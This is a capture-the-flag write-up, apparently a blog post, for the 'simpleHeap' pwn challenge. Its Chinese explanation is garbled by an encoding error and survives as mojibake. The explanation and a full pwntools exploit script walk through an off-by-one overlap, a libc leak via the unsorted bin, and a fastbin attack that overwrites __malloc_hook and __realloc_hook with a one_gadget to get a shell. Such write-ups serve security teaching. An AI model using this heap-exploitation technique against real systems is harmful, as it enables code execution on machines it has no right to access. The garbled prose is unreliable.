å¯ä»¥çœ‹åˆ°ï¼Œifåˆ¤æ–­è¯­å¥æ˜¯å°äºå·ï¼Œä¹Ÿå°±æ˜¯è¯´å½“å˜é‡ç­‰äºsize+1çš„æ—¶å€™ä¾ç„¶å¯ä»¥å¯ä»¥è¯»å…¥æ•°æ®ï¼Œè¿™å°±æ˜¯å…¸å‹çš„off-by-oneæ¼æ´ pwn it ï¼ï¼ï¼ æ€è·¯åˆ†æ è¿™ä¸ªç¨‹åºä¿æŠ¤å…¨å¼€ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½æ”»å‡»gotè¡¨äº†ï¼Œæˆ‘ä»¬åªèƒ½é€‰æ‹©__malloc_hookå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬è¦æƒ³æ‰¾åˆ°__malloc_hookå‡½æ•°ï¼Œæˆ‘ä»¬å¿…é¡»æ³„æ¼libcï¼Œä½†æ˜¯ç¨‹åºåªå…è®¸æˆ‘ä»¬ç”³è¯·fastbinå¤§å°çš„chunk è¿™ä¸ªé¢˜æœ‰ä¸€ä¸ªå¾ˆå·§å¦™çš„æ³„æ¼libcçš„æ–¹æ³•ï¼Œå°±æ˜¯å°†ä¸¤ä¸ªfastbinåˆå¹¶æˆä¸€ä¸ªunsortedbinï¼Œåˆ©ç”¨unsorted binæ¥æ³„æ¼main_arena + 88çš„ä½ç½®ï¼Œç„¶åæ‹¿åˆ°libcåŸºå€ã€‚ å…·ä½“æ€è·¯æ˜¯è¿™æ ·çš„ï¼Œæ„é€ å››ä¸ªchunkï¼š chunk 0 : size 0x18 chunk 1 : size 0x50 chunk 2 : size 0x60 chunk 3 : size 0x10 ï¼ˆé˜²æ­¢ä¸top chunkåˆå¹¶ï¼‰ æˆ‘ä»¬é€šè¿‡off-by-oneå°†1å’Œ2åˆå¹¶ï¼Œfree 1ï¼Œè¿™ä¸ªæ—¶å€™1å’Œ2åˆå¹¶çš„chunkå·²ç»è¶…è¿‡fastbinï¼Œè¿›å…¥unsorted binï¼Œæˆ‘ä»¬å†malloc(0x50)ï¼Œè¿™ä¸ªæ—¶å€™unsorted binå°±ä¼šåˆ‡å‰²ä¸‹æ¥0x50ï¼Œå‰©ä¸‹2å·chunkç•™åœ¨unsorted biné‡Œé¢ï¼Œä½†æ˜¯ï¼ï¼æˆ‘ä»¬ä»å§‹è‡³ç»ˆéƒ½æ²¡æœ‰free chunk 2ï¼Œ2å·æŒ‡é’ˆçš„æ§åˆ¶æƒä»ç„¶åœ¨æˆ‘ä»¬æ‰‹ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰“å°2å·chunkçš„å†…å®¹ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸º2å·chunkåœ¨unsorted biné‡Œï¼Œå…¶fd å’Œ bkéƒ½æ˜¯æœ‰å†…å®¹çš„ï¼ï¼ä»–ä»¬éƒ½æŒ‡å‘äº†main_arena + 88ï¼Œé€šè¿‡è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°±èƒ½æ³„æ¼å‡ºlibcçš„åŸºåœ°å€ æˆ‘ä»¬æ‹¿åˆ°åŸºå€åï¼Œå°±å¾—æƒ³åŠæ³•fastbin attackï¼Œæœ‰ä¸€ç§åŠæ³•å°±æ˜¯æˆ‘ä»¬ä¸Šæ–‡è¯´çš„æ–¹æ³•ï¼Œæ„é€ ä¸‰ä¸ªfastbin chunkï¼Œè‡ªç„¶æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯å¦‚æœé¢˜ç›®é™åˆ¶æˆ‘ä»¬mallocæ¬¡æ•°ï¼Œæˆ‘ä»¬è¿˜æœ‰åŠæ³•å—ï¼Ÿï¼ˆè¿™ä¸ªé¢˜ç›®è™½ç„¶é™åˆ¶æ¬¡æ•°ï¼Œä½†æ˜¯ä¾ç„¶ç”³è¯·ä¸‰æ¬¡ä¾ç„¶åœ¨å…è®¸çš„èŒƒå›´ä¹‹å†…ï¼‰ ç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œæˆ‘ä»¬å¯ä»¥malloc(0x60)ï¼Œè®°æˆchunk 4ï¼Œç„¶åæˆ‘ä»¬ç´§æ¥ç€free 4ï¼Œè¿™ä¹ˆåšçš„ç›®çš„å°±æ˜¯å°†è¿™å—chunkä»unsorted binä¸­ç§»åŠ¨åˆ° fastbinä¸­ï¼Œso æˆ‘ä»¬å†æ¬¡åˆ©ç”¨ allocated æ€çš„2å·pointeræ¥editï¼ŒæŠŠfdä½æ”¹æˆ__malloc_hook - 0x23ï¼Œç„¶åone_gadget ä½†æ˜¯è¿™ä¸ªé¢˜ç›®åœ¨gadgetçš„æ—¶å€™æˆ‘ä»¬å‘ç°æ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºå››ä¸ªgadgetçš„å¯„å­˜å™¨çš„æ¡ä»¶æˆ‘ä»¬å‡ä¸æ»¡è¶³ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—å€ŸåŠ©__libc_reallocå‡½æ•°æ¥è°ƒæ•´å¯„å­˜å™¨çš„å€¼ï¼Œåœ¨__libc_reallocå‡½æ•°ä¸­ä¼šè°ƒç”¨__realloc_hookå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠone_gadgetçš„ä½ç½®æ‰“åˆ°__realloc_hookçš„ä½ç½®ï¼ŒæŠŠ__libc_reallocçš„åœ°å€æ‰“åˆ°__malloc_hooké‡Œé¢å³å¯ï¼Œä»¤äººå…´å¥‹çš„æ˜¯ï¼Œ__realloc_hookçš„ä½ç½®å°±åœ¨__malloc_hookçš„ä¸Šæ–¹ï¼Œè¿™æ ·æˆ‘ä»¬çš„ç¨‹åºæ‰§è¡Œæµç¨‹ä¸ºï¼Œæˆ‘ä»¬malloc---&gt;è§¦å‘__malloc_hook---&gt;è·³è½¬åˆ°__libc_reallocè°ƒæ•´å¯„å­˜å™¨---&gt;è§¦å‘__realloc_hook---&gt;__realloc_hookæ˜¯æˆ‘ä»¬çš„one_gadget---&gt;get shell !!! __malloc_hook = fake_chunk_mem - 0x13 __realloc_hook = fake_chunk_mem - 0x13 - 0x5 æ¼æ´åˆ©ç”¨ exp:ï¼ˆpwntoolsç‰ˆæœ¬æ˜¯python3çš„ç‰ˆæœ¬ï¼‰ from pwn import * local = 0 if local == 1: sh = process('./vn_pwn_simpleHeap') else: sh = remote('node3.buuoj.cn',28903) libc = ELF('./libc-2.23.so') elf = ELF('./vn_pwn_simpleHeap') def add(size,content): sh.recvuntil('choice: ') sh.sendline('1') sh.sendlineafter('size?',str(size)) sh.sendafter('content:',content) def edit(index,content): sh.sendlineafter('choice: ','2') sh.sendlineafter('idx?',str(index)) sh.sendafter('content',content) def show(index): sh.sendlineafter('choice: ','3') sh.sendlineafter('idx?',str(index)) def delete(index): sh.sendlineafter('choice: ','4') sh.sendlineafter('idx?',index) print(&quot;============================== 1: by using off-by-one we can do a overlapping chunk ===================== &quot;) add(0x18,b'A'*0x18) #index 0 0x18 because we use the next chunk prevsize double using add(0x50,b'A') #index 1 add(0x60,b'A') #index 2 add(0x10,b'A') #index 3 to protect edit(0,b'A' * 0x18 + b'\\xd1') # off by one to change the &quot;index 1&quot; chunk's size print(&quot;============================ 2: leak libc by unsortedbin ==================================== &quot;) delete('1') add(0x50,'B') show(2) #index 2 memorize the unsorted bin's fd pointer and bk pointer but we don't free index 2 main_arena_88 = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) main_arena = main_arena_88 - 88 libc_base = (main_arena - 0x10) - libc.symbols['__malloc_hook'] #libc_base = __malloc_hook - __malloc_hook_offset print(hex(libc_base)) print(&quot;================================ 3: fastbin attack ---&gt; attack __malloc_hook-0x23 ================&quot;) malloc_hook = libc_base + libc.symbols['__malloc_hook'] fake_chunk = malloc_hook - 0x23 print('the next,we use 2 pointers to point a same chunk!!!!!!!!!!!!!!!!!!!!!!!!!!') add(0x60,b'A' * 16) #index 4 delete('2') print('########################## actually , the free pointer &quot;index 2&quot; and the allocated pointer &quot;index 4&quot; point a same chunk ################') print(&quot;######### we use the allocated pointer to write 'fd pointer' #############&quot;) edit(4,p64(fake_chunk)+b'\\n') one_gadget = libc_base + 0x4526a #one_gadget print(&quot;################# by gdb ,we find that we can't one_gadget.So we must change the stack(rsp) by __libc_realloc ################&quot;) realloc_hook = libc_base + libc.symbols['__libc_realloc'] + 12 realloc_hook_1 = libc_base + 0x846CC print(&quot;we change the '__malloc_hook' '__libc_realloc'(it will be call realloc_hook!!!) , 'realloc_hook' change to one_gadget !!!!&quot;) print(&quot;'realloc_hook' in '__malloc_hook'-0x8 !!!!!!!! &quot;) payload = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook) + b'\\n' add(0x60,'A') #index 2 which fd pointer point fake chunk add(0x60,payload) #index fake chunk print(&quot;============================== 4: one_gadget ===========================&quot;) sh.sendline('1') sh.sendline('32') sh.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-simpleheap/"}]}